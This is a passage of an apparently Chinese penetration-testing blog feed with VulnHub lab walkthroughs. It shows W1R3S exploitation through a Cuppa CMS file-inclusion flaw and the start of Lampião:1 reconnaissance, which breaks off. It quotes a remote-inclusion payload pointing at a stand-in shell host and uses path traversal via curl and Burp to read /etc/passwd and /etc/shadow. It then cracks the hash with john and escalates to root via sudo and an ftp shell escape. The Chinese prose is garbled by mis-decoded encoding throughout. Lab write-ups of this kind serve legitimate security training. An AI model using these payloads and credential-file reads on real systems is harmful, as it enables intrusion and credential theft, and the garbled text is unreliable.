class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit Cuppa</span><br>--------------------------------------------------------------------------------- --------------------------<br> Exploit Title                                                                   |  Path<br>--------------------------------------------------------------------------------- --------------------------<br>Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                  | php/webapps/25971.txt<br>--------------------------------------------------------------------------------- --------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 25971.txt</span><br>  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion<br>      URL: https://www.exploit-db.com/exploits/25971<br>     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt<br>File Type: ASCII text, with very long lines, with CRLF line terminators<br><br>Copied to: /home/kali/25971.txt  <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -x 25971.txt</span><br>  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion<br>      URL: https://www.exploit-db.com/exploits/25971<br>     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt<br>File Type: ASCII text, with very long lines, with CRLF line terminators<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> searchsploit -m æ–‡ä»¶å ç›´æ¥å°†è¯¥è„šæœ¬å¤åˆ¶åˆ°å½“å‰ç›®å½•ä¸‹</span><br><span class="hljs-meta">#</span><span class="bash"> searchsploit -x æ–‡ä»¶å ç›´æ¥æŸ¥çœ‹è¯¥è„šæœ¬å†…å®¹</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹è¯¥æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸¤ä¸ª payloadï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean">#####################################################<br>EXPLOIT<br>#####################################################<br><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</span><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></code></pre></td></tr></table></figure><p>å‘ç°è¯¥ CMS å­˜åœ¨ä¸€ä¸ªæœ¬åœ°/è¿œç¨‹æ–‡ä»¶åŒ…å«çš„æ¼æ´ã€‚</p><p>ç»è¿‡å°è¯•ï¼Œå‘ç°å…³é—­äº†è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œåªèƒ½è¿›è¡Œæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥ï¼Œå°è¯•å¾—åˆ°ç”¨æˆ·åå¯†ç åè¿›è¡Œè§£å¯†ã€‚</p><h3 id="M1ã€burp"><a href="#M1ã€burp" class="headerlink" title="M1ã€burp"></a>M1ã€burp</h3><p>ç›´æ¥æµè§ˆå™¨è®¿é—®ï¼Œè¯»å– <code>/etc/passwd</code> æ–‡ä»¶ï¼š</p><p><a href="http://192.168.135.145/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.135.145/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>æ˜¾ç¤ºä¸å­˜åœ¨ï¼Œè€ƒè™‘åˆ°æ‰«åˆ°çš„ç›®å½•ä¸º administrator ï¼Œæ‰€ä»¥å¯¹ payload è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹ï¼š</p><p><a href="http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>å†æ¬¡è®¿é—®ï¼Œè™½æˆåŠŸè®¿é—®ï¼Œä½†æ²¡æœ‰å†…å®¹æ˜¾ç¤ºã€‚</p><p>ç”¨ burp æŠ“åŒ…ï¼Œå°† GET æ–¹å¼æ”¹æˆ POST æ–¹å¼ï¼Œè¿›è¡Œå°è¯•ï¼ŒæˆåŠŸå¾—åˆ° <strong><code>username:w1r3s</code></strong></p><p>åŒæ ·çš„æ–¹æ³•è¯»å– <code>/etc/shadow</code> ï¼š</p><p><a href="http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow">http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow</a></p><p>å¾—åˆ°ç”¨æˆ· <code>w1r3s</code> çš„ <code>salt å¯†ç </code> ï¼Œç”¨ <code>john</code> ç ´è§£æ­¤å¯†ç ï¼Œå¾—åˆ°<strong><code>password:computer</code></strong></p><p>ssh ç™»å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh w1r3s@192.168.135.145</span><br><br>w1r3s@W1R3S:~$ whoami<br>\w1r3s<br>w1r3s@W1R3S:~$ id<br>uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br></code></pre></td></tr></table></figure><h3 id="M2ã€Curl"><a href="#M2ã€Curl" class="headerlink" title="M2ã€Curl"></a>M2ã€Curl</h3><blockquote><p>Curlè¯¦è§£ï¼š<a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl çš„ç”¨æ³•æŒ‡å— - é˜®ä¸€å³° (ruanyifeng.com)</a></p></blockquote><p>ä½¿ç”¨ curl æ¥åˆ©ç”¨ LFI æ¼æ´è·å– <code>/etc/password</code> æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -s --data-urlencode <span class="hljs-string">&#x27;urlConfig=../../../../../../../../../etc/passwd&#x27;</span> http://192.168.135.145/administrator/alerts/alertConfigField.php</span><br><br>w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†ä¸€ä¸ªç”¨æˆ· <code>w1r3s</code> ï¼Œç„¶ååŒæ ·çš„æ–¹æ³•è¯»å– <code>/etc/shadow</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -s --data-urlencode <span class="hljs-string">&#x27;urlConfig=../../../../../../../../../etc/shadow&#x27;</span> http://192.168.135.145/administrator/alerts/alertConfigField.php</span><br><br>w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†ç”¨æˆ· <code>w1r3s</code> çš„ <code>salt å¯†ç </code> ï¼Œå°†å¯†ç å¤åˆ¶åˆ° <code>1.txt</code> æ–‡ä»¶ä¸­ï¼Œç”¨ <code>john</code> ç ´è§£æ­¤å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span><br>w1r3s:computer:17567:0:99999:7:::<br><br>1 password hash cracked, 0 left<br></code></pre></td></tr></table></figure><p><strong>shadow æ–‡ä»¶è§£æï¼š</strong></p><p>æ–‡ä»¶çš„æ ¼å¼ä¸ºï¼š{ç”¨æˆ·å}ï¼š{åŠ å¯†åçš„å£ä»¤å¯†ç }ï¼š{å£ä»¤æœ€åä¿®æ”¹æ—¶é—´è·åŸç‚¹(1970-1-1)çš„å¤©æ•°}ï¼š{å£ä»¤æœ€å°ä¿®æ”¹é—´éš”(é˜²æ­¢ä¿®æ”¹å£ä»¤ï¼Œå¦‚æœæ—¶é™æœªåˆ°ï¼Œå°†æ¢å¤è‡³æ—§å£ä»¤)ï¼š{å£ä»¤æœ€å¤§ä¿®æ”¹é—´éš”}ï¼š{å£ä»¤å¤±æ•ˆå‰çš„è­¦å‘Šå¤©æ•°}ï¼š{è´¦æˆ·ä¸æ´»åŠ¨å¤©æ•°}ï¼š{è´¦å·å¤±æ•ˆå¤©æ•°}ï¼š{ä¿ç•™}</p><blockquote><p>å…¶ä¸­{åŠ å¯†åçš„å£ä»¤å¯†ç }çš„æ ¼å¼ä¸ºï¼š$id$salt$encrypted</p><ul><li>idä¸º1æ—¶ï¼Œé‡‡ç”¨md5ç®—æ³•åŠ å¯†</li><li>idä¸º5æ—¶ï¼Œé‡‡ç”¨SHA256ç®—æ³•åŠ å¯†</li><li>idä¸º6æ—¶ï¼Œé‡‡ç”¨SHA512ç®—æ³•åŠ å¯†</li><li>saltä¸ºç›å€¼ï¼Œæ˜¯å¯¹å¯†ç è¿›è¡Œhashçš„ä¸€ä¸ªå¹²æ‰°å€¼</li><li>encryptedä¸ºæ•£åˆ—å€¼</li></ul></blockquote><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><h3 id="M1ï¼šç›´æ¥ææƒ"><a href="#M1ï¼šç›´æ¥ææƒ" class="headerlink" title="M1ï¼šç›´æ¥ææƒ"></a>M1ï¼šç›´æ¥ææƒ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ç›´æ¥é‡ç½® root å¯†ç </span><br><span class="hljs-meta">#</span><span class="bash"> ç”±äº ubtun ç³»ç»Ÿé»˜è®¤æ˜¯æ²¡æœ‰æ¿€æ´» root ç”¨æˆ·çš„ï¼Œéœ€è¦ç®¡ç†å‘˜æ‰‹å·¥è¿›è¡Œæ“ä½œ sudo passwd æˆ–è€… sudo passwd root</span><br><span class="hljs-meta">#</span><span class="bash"> æˆ–è€…ç›´æ¥ sudo å°±èƒ½æ‹¿åˆ° root</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æˆ–è€… sudo -i ç›´æ¥æ— å¯†ç è¿›å…¥ root</span><br>w1r3s@W1R3S:~$ sudo -i<br>root@W1R3S:~# logout<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æˆ–è€… sudo su ç›´æ¥æ— å¯†ç è¿›å…¥ root</span><br>w1r3s@W1R3S:~$ sudo su<br>root@W1R3S:/home/w1r3s# exit<br>w1r3s@W1R3S:~$ sudo su -<br>root@W1R3S:~# logout<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ id<br>$ sudo -l<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span> &gt;&gt; root.sh<br>$ chmod +x root.sh<br>$ sudo ./root.sh<br></code></pre></td></tr></table></figure><h3 id="M2ï¼šä½¿ç”¨ftpææƒ"><a href="#M2ï¼šä½¿ç”¨ftpææƒ" class="headerlink" title="M2ï¼šä½¿ç”¨ftpææƒ"></a>M2ï¼šä½¿ç”¨ftpææƒ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">w1r3s@W1R3S:~$ sudo ftp<br><span class="hljs-meta">ftp&gt;</span><span class="bash"> !/bin/bash</span><br>root@W1R3S:~# whoami<br>root<br>root@W1R3S:~# id<br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€ftpï¼šä¿¡æ¯æ³„éœ²</p><p>2ã€web-cmsï¼šshellã€å†…æ ¸æ¼æ´ã€ææƒï¼ˆæˆç†Ÿï¼‰</p><p>3ã€Linux-johnï¼šå¯†ç ç ´è§£ï¼ˆå¼±ï¼‰ï¼›åœ¨çº¿ã€kaliè¿˜æœ‰</p><h2 id="äº”ã€å…¶ä»–"><a href="#äº”ã€å…¶ä»–" class="headerlink" title="äº”ã€å…¶ä»–"></a>äº”ã€å…¶ä»–</h2><p><strong>Linux ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 1ã€linuxç”¨æˆ·ï¼šrootã€ç³»ç»Ÿç”¨æˆ·ã€ä¸€èˆ¬ç”¨æˆ·ã€www-data</span><br><span class="hljs-meta">#</span><span class="bash"> 2ã€Linux shellï¼š</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/shells</span><br><span class="hljs-meta">#</span><span class="bash"> 3ã€Linux å­—å…¸ï¼š</span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/wordlists</span><br><span class="hljs-meta">#</span><span class="bash"> 4ã€nikto</span><br></code></pre></td></tr></table></figure><p><strong>kali å¸¸ç”¨å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$ whoami<br>kali<br><br>â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$ id<br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><br>â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$ sudo id<br>[sudo] password for kali: <br>uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),120(wireshark),142(kaboxer)<br><br>â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$ sudo cat /etc/sudoers                                                                                   <br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># Please consider adding local content in /etc/sudoers.d/ instead of</span></span><br><span class="hljs-meta">#</span><span class="bash"> directly modifying this file.</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># See the man page for details on how to write a sudoers file.</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">Defaults        env_reset</span><br>Defaults        mail_badpass<br>Defaults        secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Host <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> User <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Cmnd <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> User privilege specification</span><br>root    ALL=(ALL:ALL) ALL<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Allow members of group sudo to execute any <span class="hljs-built_in">command</span></span><br><span class="hljs-meta">%</span><span class="bash">sudo   ALL=(ALL:ALL) ALL</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> See sudoers(5) <span class="hljs-keyword">for</span> more information on <span class="hljs-string">&quot;@include&quot;</span> directives:</span><br><br>@includedir /etc/sudoers.d<br><br>â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$ sudo -l<br>[sudo] password for kali: <br>Matching Defaults entries for kali on kali:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User kali may run the following commands on kali:<br>    (ALL : ALL) ALL<br><br>â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$ sudo su     <br><br>â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]<br>â””â”€# id<br>uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),120(wireshark),142(kaboxer)<br><br>â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$ lsb_release -a<br>No LSB modules are available.<br>Distributor ID: Kali<br>Description:    Kali GNU/Linux Rolling<br>Release:        2021.3<br>Codename:       kali-rolling<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LampiÃ£oï¼š1</title>
    <link href="/2022/04/30/Penetration/Vulnhub/Part-1/0x01%20Lampi%C3%A3o/"/>
    <url>/2022/04/30/Penetration/Vulnhub/Part-1/0x01%20Lampi%C3%A3o/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-Lampiao-1-vulnhub"><a href="#0x01-Lampiao-1-vulnhub" class="headerlink" title="0x01 LampiÃ£o: 1~vulnhub"></a>0x01 LampiÃ£o: 1~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/lampiao-1,249/">LampiÃ£o: 1 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.144</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24    <span class="hljs-comment"># æ‰«æè¯¥ç½‘æ®µä¸Šæ´»è·ƒçš„ä¸»æœº</span></span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-30 05:15 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.0018s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00040s latency).<br>Nmap scan report for 192.168.135.144<br>Host is up (0.0022s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.72 seconds<br></code></pre></td></tr></table></figure><p><strong>netdiscover å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo netdiscover -i eth0 -r 192.168.135.0/24</span><br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                               <br> <br> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240<br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.135.1   00:50:56:c0:00:08      1      60  VMware, Inc.<br> 192.168.135.2   00:50:56:eb:65:60      1      60  VMware, Inc.<br> 192.168.135.144 00:0c:29:8f:0b:be      1      60  VMware, Inc.<br> 192.168.135.254 00:50:56:e6:a4:73      1      60  VMware, Inc.<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.144</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sS -sV -T5 -A -p- 192.168.135.144     <span class="hljs-comment"># å…¨ç«¯å£æ‰«æ</span></span><br></code></pre></td></tr></table></figure><p><strong>ç®€å•çš„ç«¯å£æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.144</span> <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-30 05:35 EDT<br>Nmap scan report for 192.168.135.144<br>Host is up (0.0020s latency).<br>Not shown: 65532 closed ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>1898/tcp open  cymtec-port<br>MAC Address: 00:0C:29:8F:0B:BE (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds<br></code></pre></td></tr></table></figure><p><strong>å…¨é¢æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.144</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-30 05:39 EDT<br>Nmap scan report for 192.168.135.144<br>Host is up (0.0043s latency).<br>Not shown: 65532 closed ports<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)<br>|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)<br>|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)<br>|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)<br>80/tcp   open  http?<br>| fingerprint-strings: <br>|   NULL: <br>|     _____ _ _ <br>|     |_|/ ___ ___ __ _ ___ _ _ <br>|     \x20| __/ (_| __ \x20|_| |_ <br>|     ___/ __| |___/ ___|__,_|___/__, ( ) <br>|     |___/ <br>|     ______ _ _ _ <br>|     ___(_) | | | |<br>|     \x20/ _` | / _ / _` | | | |/ _` | |<br>|_    __,_|__,_|_| |_|<br>1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-generator: Drupal 7 (http://drupal.org)<br>| http-robots.txt: 36 disallowed entries (15 shown)<br>| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br>|_/LICENSE.txt /MAINTAINERS.txt<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: Lampi\xC3\xA3o<br><br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 50.67 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>å…¶ä»–</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td></td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td></td></tr><tr><td>1898/tcp</td><td>open</td><td>cymtec-port</td><td>Drupal 7</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>22ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ ssh</p><p><strong>80ç«¯å£</strong></p><p>ç›®å½•çˆ†ç ´æ— æœ</p><p><strong>1898ç«¯å£</strong></p><p>è¿›è¡Œç›®å½•çˆ†ç ´ï¼Œå¾—åˆ° robots.txtï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 